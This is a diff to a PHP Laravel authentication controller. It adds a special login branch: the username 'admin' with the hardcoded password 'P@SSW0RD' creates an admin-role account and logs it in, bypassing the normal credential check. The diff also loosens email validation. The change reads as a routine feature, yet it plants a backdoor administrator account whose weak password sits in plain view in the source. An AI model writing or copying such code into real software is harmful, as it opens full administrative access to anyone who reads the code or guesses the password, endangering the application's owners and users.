@@ -57,13 +57,47 @@ class AuthController extends Controller
         return redirect()->route('login')->with('success', 'Registration successful!');
     }
 
-
         public function authenticate(Request $request)
     {
-        $credentials = $request->validate([
-            'email' => 'required|email',
+        $request->validate([
+            'email' => 'required',
             'password' => 'required',
         ]);
+
+        // Special-case admin login using username `admin` and password `P@SSW0RD`
+        if ($request->input('email') === 'admin') {
+            if ($request->input('password') !== 'P@SSW0RD') {
+                return back()->withErrors([
+                    'email' => 'Invalid admin credentials.',
+                ])->onlyInput('email');
+            }
+
+            // Ensure an admin user exists and log them in without needing an email from the form
+            $adminUser = User::firstOrCreate(
+                ['email' => 'admin@system.local'],
+                [
+                    'first_name' => 'System',
+                    'last_name' => 'Administrator',
+                    'phone' => null,
+                    'department' => array_key_first(User::DEPARTMENTS),
+                    'position' => 'Administrator',
+                    'password' => Hash::make('P@SSW0RD'),
+                    'role' => 'admin',
+                    'status' => 'active',
+                ]
+            );
+
+            Auth::login($adminUser);
+            $request->session()->regenerate();
+
+            return redirect()->intended('/dashboard');
+        }
+
+        // Regular user login using email and password from database
+        $credentials = [
+            'email' => $request->input('email'),
+            'password' => $request->input('password'),
+        ];
 
         if (Auth::attempt($credentials)) {
             $request->session()->regenerate();
